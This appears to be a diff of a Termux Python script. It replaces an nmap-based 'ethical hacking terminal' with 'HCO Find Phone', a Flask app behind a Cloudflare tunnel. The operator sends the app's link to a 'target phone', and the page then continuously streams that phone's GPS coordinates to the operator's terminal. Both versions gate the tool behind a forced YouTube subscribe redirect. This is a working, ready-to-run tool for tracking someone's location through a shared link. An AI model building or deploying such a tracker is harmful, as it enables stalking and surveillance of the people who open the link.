@@ -1,313 +1,292 @@
-#!/usr/bin/env python3
-# HCO Terminal Pro — Advanced Ethical Hacking Terminal
-# By Azhar (Hackers Colony)
-# Single-file Termux interactive tool
+# HCO Find Phone by Azhar - Fully Automatic Termux Version
+# Requirements: Termux, Python3, Flask, cloudflared, Termux:API
 
-import os, sys, platform, subprocess, time, random, curses, requests, json
+import os, subprocess, threading, time, re, sys
+from flask import Flask, request, render_template_string, jsonify
 
-# -------------------- Configuration --------------------
-YOUTUBE_URL = "https://youtube.com/@hackers_colony_tech"
-TOOL_LOCK_SECONDS = 10
-DASHBOARD_SIZE = 12  # Number of commands to keep in dashboard
-QUOTE_LIST = [
-    "The quieter you become, the more you hear.",
-    "Stay ethical, stay curious.",
-    "Learn, Practice, Protect.",
-    "Knowledge is power, hacking is skill.",
-    "Scan only your own devices. Ethics first."
-]
-LEARNING_TOPICS = {
-    "nmap": "Nmap discovers hosts and services. Use: scan <IP>",
-    "ping": "Ping checks connectivity. Use: ping <host>",
-    "whois": "WHOIS shows domain/IP info. Use: whois <domain/IP>",
-    "dns": "DNS resolves domains. Use: dnslookup <domain>",
-    "ethical": "Always get written permission before scanning.",
-    "safeports": "Scan only safe ports like 22, 80, 443 for practice.",
+# Color codes with bold
+RED = "\033[1;91m"
+GREEN = "\033[1;92m"
+CYAN = "\033[1;96m"
+YELLOW = "\033[1;93m"
+MAGENTA = "\033[1;95m"
+BLUE = "\033[1;94m"
+WHITE = "\033[1;97m"
+RESET = "\033[0m"
+CLEAR = "\033[2J\033[H"
+
+locations = {}
+app = Flask(__name__)
+cloudflared_process = None
+cloudflare_link = ""
+
+# ---------------- Flask routes -----------------
+dashboard_template = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HCO Find Phone by Azhar</title>
+<script>
+function sendLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.watchPosition(function(position){
+            fetch('/update', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude,
+                    accuracy: position.coords.accuracy
+                })
+            });
+        }, function(error){
+            alert("Location access denied or unavailable.");
+        }, { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 });
+    } else {
+        alert("Geolocation is not supported by your browser");
+    }
 }
-
-SAFE_PORTS = [22, 80, 443, 8080, 8888]
-
-# Global dashboard instance
-dash = None
-
-# -------------------- Utilities --------------------
-def run_cmd(cmd):
-    try:
-        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
-        return result.strip()
-    except subprocess.CalledProcessError as e:
-        return f"Error: {e.output.strip()}"
-
-def check_install(pkg):
-    if run_cmd(f"which {pkg}") == "":
-        os.system(f"pkg install {pkg} -y")
-
-def clear():
-    os.system("clear")
-
-# -------------------- Tool Lock --------------------
-def tool_lock():
-    clear()
-    print("This tool is locked 🔒")
-    print("Only ethical usage allowed! Scan your own devices/networks.\n")
-    
-    # Countdown
-    for i in range(TOOL_LOCK_SECONDS,0,-1):
-        print(f"Redirecting to YouTube in {i} seconds...", end="\r")
-        time.sleep(1)
-    print("\n")
-    
-    # Try to open YouTube via Termux-open
-    try:
-        os.system(f'termux-open "{YOUTUBE_URL}"')
-    except:
-        print(f"Open YouTube manually: {YOUTUBE_URL}")
-    
-    input("Press Enter after returning from YouTube to unlock...")
-
-# -------------------- Dashboard --------------------
-class Dashboard:
-    def __init__(self, size=DASHBOARD_SIZE):
-        self.size = size
-        self.entries = []
-
-    def add_entry(self, command, output):
-        timestamp = time.strftime("%H:%M:%S")
-        self.entries.append((timestamp, command, output))
-        if len(self.entries) > self.size:
-            self.entries.pop(0)
-
-    def display(self, stdscr):
-        row = 5
-        for ts, cmd, out in self.entries:
-            stdscr.addstr(row, 0, f"[{ts}] {cmd}", curses.color_pair(3))
-            row += 1
-            for line in out.split("\n"):
-                if row >= curses.LINES - 1:
-                    break
-                stdscr.addstr(row, 2, line, curses.color_pair(1))
-                row += 1
-            row += 1
-            if row >= curses.LINES - 1:
-                break
-        stdscr.refresh()
-
-# -------------------- Banner --------------------
-def banner(stdscr):
-    stdscr.addstr(0, 0, f"HCO Terminal Pro — by Azhar", curses.color_pair(2))
-    stdscr.addstr(1, 0, "Ethical Hacking & Termux Learning", curses.color_pair(3))
-    stdscr.addstr(2, 0, "-"*60, curses.color_pair(4))
-    quote = random.choice(QUOTE_LIST)
-    stdscr.addstr(3, 0, f"Quote: {quote}", curses.color_pair(1))
-
-# -------------------- Commands --------------------
-def cmd_help(args=None):
-    return """
-Available Commands:
-scan <IP>        - nmap scan
-ports <IP>       - quick TCP port check
-ping <host>      - ping host
-dnslookup <dom>  - DNS lookup
-whois <dom/IP>   - WHOIS info
-traceroute <host)- route packets
-netinfo          - IP/interfaces/connections
-checkurl <URL>   - HTTP headers/status
-ipinfo <IP>      - Geolocation info
-fetch <URL>      - Download file
-banner <text>    - Print hacker banner
-motd             - Quote of the day
-learn <topic>    - Short ethical hacking explanation
-examples         - Show ethical examples
-tips             - Ethical hacking tips
-safeports        - Safe ports to scan
-osinfo           - OS, CPU, Python version
-diskinfo         - Disk usage
-meminfo          - RAM & swap
-termuxinfo       - Termux environment info
-whoami           - Current user & hostname
-uptime           - System uptime
-history          - Show command history
-clear            - Clear dashboard
-help             - This help
-exit             - Quit
+window.onload = function() {
+    sendLocation();
+    document.getElementById('status').innerHTML = 'Requesting location access...';
+};
+</script>
+<style>
+body { 
+    background: #000; 
+    color: #0f0; 
+    text-align: center; 
+    font-family: Arial, sans-serif; 
+    padding: 20px;
+}
+h1 { 
+    font-size: 28px; 
+    margin-top: 30px;
+    color: #ff0000;
+    text-shadow: 0 0 10px #ff0000;
+}
+p { 
+    font-size: 18px; 
+    color: #0f0; 
+    margin: 15px 0;
+}
+.container {
+    max-width: 500px;
+    margin: 0 auto;
+    border: 2px solid #0f0;
+    border-radius: 10px;
+    padding: 20px;
+    background: #111;
+}
+.logo {
+    font-size: 24px;
+    font-weight: bold;
+    margin-bottom: 20px;
+    color: #ff0000;
+}
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="logo">HCO FIND PHONE BY AZHAR</div>
+    <p>Your location will be sent automatically to the Termux dashboard.</p>
+    <p id="status">Waiting for permission...</p>
+    <p>Keep this page open for continuous tracking</p>
+</div>
+</body>
+</html>
 """
 
-def cmd_scan(args):
-    if not args: return "Usage: scan <IP>"
-    return run_cmd(f"nmap {args[0]} -Pn -sV")
+@app.route('/')
+def dashboard():
+    return render_template_string(dashboard_template)
 
-def cmd_ports(args):
-    if not args: return "Usage: ports <IP>"
-    results=[]
-    for port in SAFE_PORTS:
-        res = run_cmd(f"nc -zv {args[0]} {port} 2>&1")
-        results.append(res)
-    return "\n".join(results)
+@app.route('/location')
+def get_location():
+    return jsonify(locations)
 
-def cmd_ping(args): 
-    return run_cmd(f"ping -c 4 {args[0]}") if args else "Usage: ping <host>"
+@app.route('/update', methods=['POST'])
+def update_location():
+    data = request.json
+    if data and 'lat' in data and 'lon' in data:
+        locations['lat'] = data['lat']
+        locations['lon'] = data['lon']
+        locations['accuracy'] = data.get('accuracy', 'N/A')
+        locations['last_update'] = time.time()
+        return "OK"
+    return "Invalid Data"
 
-def cmd_dnslookup(args): 
-    return run_cmd(f"nslookup {args[0]}") if args else "Usage: dnslookup <domain>"
+def start_server():
+    import logging
+    log = logging.getLogger('werkzeug')
+    log.setLevel(logging.ERROR)
+    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
 
-def cmd_whois(args): 
-    return run_cmd(f"whois {args[0]}") if args else "Usage: whois <domain/IP>"
-
-def cmd_traceroute(args): 
-    return run_cmd(f"traceroute {args[0]}") if args else "Usage: traceroute <host>"
-
-def cmd_netinfo(args): 
-    return run_cmd("ifconfig || ip addr")
-
-def cmd_checkurl(args): 
-    return run_cmd(f"curl -I {args[0]}") if args else "Usage: checkurl <URL>"
-
-def cmd_ipinfo(args):
-    if not args: return "Usage: ipinfo <IP>"
+# ---------------- Tool lock + countdown + YouTube -----------------
+def tool_lock_youtube():
+    os.system(CLEAR)
+    print(f"{RED}{'='*80}{RESET}")
+    print(f"{RED}{'🔒 TOOL LOCKED 🔒'.center(80)}{RESET}")
+    print(f"{RED}{'Subscribe & click the BELL icon on YouTube 🔔'.center(80)}{RESET}")
+    print(f"{RED}{'='*80}{RESET}\n")
+    print(f"{CYAN}{'Redirecting in:'.center(80)}{RESET}\n")
+    
+    # Simple countdown without clearing lines
+    for i in range(9, 0, -1):
+        print(f"{CYAN}{str(i).center(80)}{RESET}")
+        time.sleep(1)
+    
+    youtube_url = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
     try:
-        res = requests.get(f"https://ipinfo.io/{args[0]}/json", timeout=5)
-        data = res.json()
-        return json.dumps(data, indent=2)
-    except Exception as e:
-        return f"Failed to fetch IP info: {str(e)}"
+        subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", "-d", youtube_url], 
+                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print(f"{GREEN}Opening YouTube...{RESET}")
+    except:
+        print(f"{YELLOW}Open YouTube manually: {youtube_url}{RESET}")
+    
+    input(f"\n{YELLOW}Press ENTER after returning from YouTube...{RESET}")
 
-def cmd_fetch(args): 
-    return run_cmd(f"curl -O {args[0]}") if args else "Usage: fetch <URL>"
-
-def cmd_banner(args): 
-    if not args: return "Usage: banner <text>"
-    text=" ".join(args)
-    if run_cmd("which toilet") != "": 
-        os.system(f'toilet -f mono12 -F metal "{text}"')
-    elif run_cmd("which figlet") != "": 
-        os.system(f'figlet "{text}"')
-    else: 
-        return "Install toilet or figlet to use banner"
-    return "Banner displayed"
-
-def cmd_motd(args=None): 
-    return random.choice(QUOTE_LIST)
-
-def cmd_learn(args): 
-    if not args: return "Usage: learn <topic>"
-    return LEARNING_TOPICS.get(args[0].lower(), "No info for this topic")
-
-def cmd_examples(args=None):
-    return "Example usage:\nscan 192.168.1.1\nports 192.168.1.1\nping 8.8.8.8\nfetch https://example.com/file.txt"
-
-def cmd_tips(args=None):
-    return "Tips:\n- Always scan your own devices.\n- Never misuse commands.\n- Practice in labs.\n- Document responsibly."
-
-def cmd_safeports(args=None): 
-    return f"Safe ports: {', '.join(map(str, SAFE_PORTS))}"
-
-def cmd_osinfo(args=None): 
-    return f"OS: {platform.system()} {platform.release()}\nPython: {platform.python_version()}\nMachine: {platform.machine()}"
-
-def cmd_diskinfo(args=None): 
-    return run_cmd("df -h")
-
-def cmd_meminfo(args=None): 
-    return run_cmd("free -h")
-
-def cmd_termuxinfo(args=None): 
-    return f"HOME={os.environ.get('HOME','N/A')}\nPATH={os.environ.get('PATH','N/A')}"
-
-def cmd_whoami(args=None): 
-    return f"User: {run_cmd('whoami')} | Host: {run_cmd('hostname')}"
-
-def cmd_uptime(args=None): 
-    return run_cmd("uptime")
-
-def cmd_clear(args=None): 
-    return "clear"
-
-def cmd_history(args=None): 
-    return "\n".join([f"{i+1}. {c[1]}" for i,c in enumerate(dash.entries)])
-
-COMMANDS = {
-    "help": cmd_help,
-    "scan": cmd_scan,
-    "ports": cmd_ports,
-    "ping": cmd_ping,
-    "dnslookup": cmd_dnslookup,
-    "whois": cmd_whois,
-    "traceroute": cmd_traceroute,
-    "netinfo": cmd_netinfo,
-    "checkurl": cmd_checkurl,
-    "ipinfo": cmd_ipinfo,
-    "fetch": cmd_fetch,
-    "banner": cmd_banner,
-    "motd": cmd_motd,
-    "learn": cmd_learn,
-    "examples": cmd_examples,
-    "tips": cmd_tips,
-    "safeports": cmd_safeports,
-    "osinfo": cmd_osinfo,
-    "diskinfo": cmd_diskinfo,
-    "meminfo": cmd_meminfo,
-    "termuxinfo": cmd_termuxinfo,
-    "whoami": cmd_whoami,
-    "uptime": cmd_uptime,
-    "clear": cmd_clear,
-    "history": cmd_history,
-    "exit": lambda args=None: sys.exit(0)
-}
-
-# -------------------- Dependencies --------------------
-def install_dependencies():
-    pkgs=["nmap","curl","wget","figlet","toilet","whois","dnsutils","netcat","git","python"]
-    for pkg in pkgs: 
-        check_install(pkg)
-
-# -------------------- Main curses loop --------------------
-def main_dashboard(stdscr):
-    global dash
-    dash = Dashboard()
-    curses.start_color()
-    curses.use_default_colors()
-    curses.init_pair(1, curses.COLOR_GREEN, -1)   # output
-    curses.init_pair(2, curses.COLOR_CYAN, -1)    # banner title
-    curses.init_pair(3, curses.COLOR_YELLOW, -1)  # command
-    curses.init_pair(4, curses.COLOR_MAGENTA, -1) # separator
-
-    banner(stdscr)
-
-    while True:
-        stdscr.addstr(4, 0, "[HCO-Terminal]> ", curses.color_pair(1))
-        stdscr.refresh()
-        curses.echo()
+# ---------------- Start cloudflared tunnel and capture URL automatically -----------------
+def start_cloudflared():
+    global cloudflare_link
+    
+    print(f"{YELLOW}Starting Cloudflare tunnel...{RESET}")
+    time.sleep(2)
+    
+    # Check if cloudflared is installed
+    try:
+        result = subprocess.run(["cloudflared", "--version"], 
+                               capture_output=True, text=True, timeout=5)
+        if result.returncode != 0:
+            print(f"{RED}Cloudflared not found. Installing...{RESET}")
+            subprocess.run(["pkg", "install", "cloudflared", "-y"], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except:
+        print(f"{RED}Cloudflared not found. Installing...{RESET}")
+        subprocess.run(["pkg", "install", "cloudflared", "-y"], 
+                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    
+    # Start cloudflared in a separate thread to avoid blocking
+    def run_cloudflared():
+        global cloudflare_link
         try:
-            cmd_input = stdscr.getstr(4, 17).decode("utf-8").strip()
-        except:
-            continue
-        curses.noecho()
-        if not cmd_input: 
-            continue
-        parts = cmd_input.split()
-        cmd = parts[0].lower()
-        args = parts[1:]
-        func = COMMANDS.get(cmd, None)
-        if func:
-            try:
-                output = func(args)
-            except Exception as e:
-                output = f"Error executing command: {str(e)}"
-        else:
-            output = f"Unknown command: {cmd}"
+            # First kill any existing cloudflared processes
+            subprocess.run(["pkill", "-f", "cloudflared"], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(2)
             
-        if output == "clear":
-            stdscr.clear()
-            dash.entries.clear()
-            banner(stdscr)
-        else:
-            dash.add_entry(cmd_input, output)
-            stdscr.clear()
-            banner(stdscr)
-            dash.display(stdscr)
+            # Start cloudflared
+            process = subprocess.Popen([
+                "cloudflared", "tunnel", "--url", "http://127.0.0.1:5000"
+            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            
+            # Read output to find URL
+            while True:
+                line = process.stderr.readline()
+                if not line:
+                    break
+                if "https://" in line and "trycloudflare.com" in line:
+                    match = re.search(r"(https://[^\s]+\.trycloudflare\.com)", line)
+                    if match:
+                        cloudflare_link = match.group(1)
+                        print(f"{GREEN}Cloudflare URL found: {cloudflare_link}{RESET}")
+                        break
+            
+            process.wait()
+        except Exception as e:
+            print(f"{RED}Error in cloudflared: {e}{RESET}")
+    
+    # Start cloudflared in a thread
+    cloudflared_thread = threading.Thread(target=run_cloudflared, daemon=True)
+    cloudflared_thread.start()
+    
+    # Wait for URL to be found or timeout
+    timeout = 20
+    start_time = time.time()
+    while time.time() - start_time < timeout:
+        if cloudflare_link:
+            break
+        time.sleep(1)
+        print(f"{YELLOW}Waiting for Cloudflare tunnel ({int(time.time() - start_time)}s)...{RESET}")
+    
+    if not cloudflare_link:
+        print(f"{RED}Could not automatically get Cloudflare URL.{RESET}")
+        print(f"{YELLOW}Please start cloudflared manually in a NEW Termux tab:{RESET}")
+        print(f"{CYAN}cloudflared tunnel --url http://127.0.0.1:5000{RESET}")
+        print(f"{YELLOW}Then paste the URL here:{RESET}")
+        cloudflare_link = input().strip()
+    
+    return cloudflare_link
 
-# -------------------- Main --------------------
+# ---------------- Display banner -----------------
+def display_banner():
+    os.system(CLEAR)
+    print(f"{RED}{'='*80}{RESET}")
+    print(f"{RED}{'HCO FIND PHONE BY AZHAR'.center(80)}{RESET}")
+    print(f"{RED}{'='*80}{RESET}\n")
+    print(f"{GREEN}{'Send this link to the phone to track location:'.center(80)}{RESET}\n")
+    print(f"{CYAN}{cloudflare_link.center(80)}{RESET}\n")
+    print(f"{YELLOW}{'Waiting for live location updates...'.center(80)}{RESET}\n")
+    print(f"{MAGENTA}{'Press Ctrl+C to exit'.center(80)}{RESET}\n")
+
+# ---------------- Main -----------------
 if __name__ == "__main__":
-    tool_lock()            # Tool lock + YouTube redirect
-    install_dependencies()  # Ensure all packages installed
-    curses.wrapper(main_dashboard)
+    try:
+        # First show tool lock and YouTube redirect
+        tool_lock_youtube()
+        
+        # Clear screen after YouTube redirect
+        os.system(CLEAR)
+        print(f"{GREEN}Starting HCO Find Phone tool...{RESET}")
+        
+        # Start Flask server
+        print(f"{YELLOW}Starting server...{RESET}")
+        server_thread = threading.Thread(target=start_server, daemon=True)
+        server_thread.start()
+        
+        # Wait a moment for the server to start
+        time.sleep(3)
+        
+        # Start Cloudflare tunnel and capture public URL
+        print(f"{YELLOW}Setting up Cloudflare tunnel...{RESET}")
+        cloudflare_url = start_cloudflared()
+        
+        # Display banner with the link
+        display_banner()
+        
+        # Live location printing in Termux
+        last_location_time = 0
+        while True:
+            if locations and 'last_update' in locations:
+                current_time = time.time()
+                # Only update if we have a new location
+                if locations['last_update'] > last_location_time:
+                    last_location_time = locations['last_update']
+                    time_str = time.strftime('%H:%M:%S', time.localtime(locations['last_update']))
+                    print(f"{GREEN}📍 LIVE LOCATION {time_str}{RESET}")
+                    print(f"{GREEN}Latitude: {locations.get('lat')}{RESET}")
+                    print(f"{GREEN}Longitude: {locations.get('lon')}{RESET}")
+                    print(f"{GREEN}Accuracy: {locations.get('accuracy', 'N/A')}m{RESET}")
+                    print(f"{BLUE}{'-'*40}{RESET}")
+            else:
+                print(f"{YELLOW}Waiting for target phone to connect...{RESET}")
+                print(f"{YELLOW}Make sure the phone opens: {CYAN}{cloudflare_url}{RESET}")
+                print(f"{BLUE}{'-'*40}{RESET}")
+            
+            time.sleep(3)
+            
+    except KeyboardInterrupt:
+        print(f"\n{RED}Shutting down...{RESET}")
+        try:
+            subprocess.run(["pkill", "-f", "cloudflared"], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except:
+            pass
+        print(f"{GREEN}Thank you for using HCO Find Phone!{RESET}")
+    except Exception as e:
+        print(f"{RED}Error: {e}{RESET}")
+        print(f"{YELLOW}Please make sure you have installed all requirements:{RESET}")
+        print(f"{CYAN}pkg install python cloudflared termux-api -y{RESET}")
+        print(f"{CYAN}pip install flask{RESET}")
